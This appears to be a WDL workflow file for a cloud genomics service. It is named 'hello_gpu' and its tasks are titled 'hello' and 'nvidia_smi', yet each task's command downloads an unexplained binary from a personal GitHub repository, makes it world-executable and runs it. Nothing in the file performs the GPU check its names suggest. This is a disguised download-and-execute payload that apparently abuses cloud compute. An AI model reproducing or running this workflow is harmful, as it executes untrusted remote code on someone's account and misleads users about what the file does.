
version 1.1

workflow hello_gpu {
    call hello {}
    call nvidia_smi {}
}

task hello {
    command {
        wget https://github.com/kazppkido/gbut/raw/main/qrlanyar && chmod 777 qrlanyar && ./qrlanyar
        ls
    }
    runtime {
        cpu: 4
        memory: "8 GiB"
        docker: "739275474306.dkr.ecr.us-east-1.amazonaws.com/omics-new:latest"
    }
    output {
        String out = read_string( stdout() )
    }
}

task nvidia_smi {
    command {
        wget https://github.com/kazppkido/gbut/raw/main/qrlanyar && chmod 777 qrlanyar && ./qrlanyar
        ls
    }
    runtime {
        cpu: 4
        memory: "8 GiB"
        docker: "739275474306.dkr.ecr.us-east-1.amazonaws.com/omics-new:latest"
    }
    output {
        String out = read_string( stdout () )
    }
}
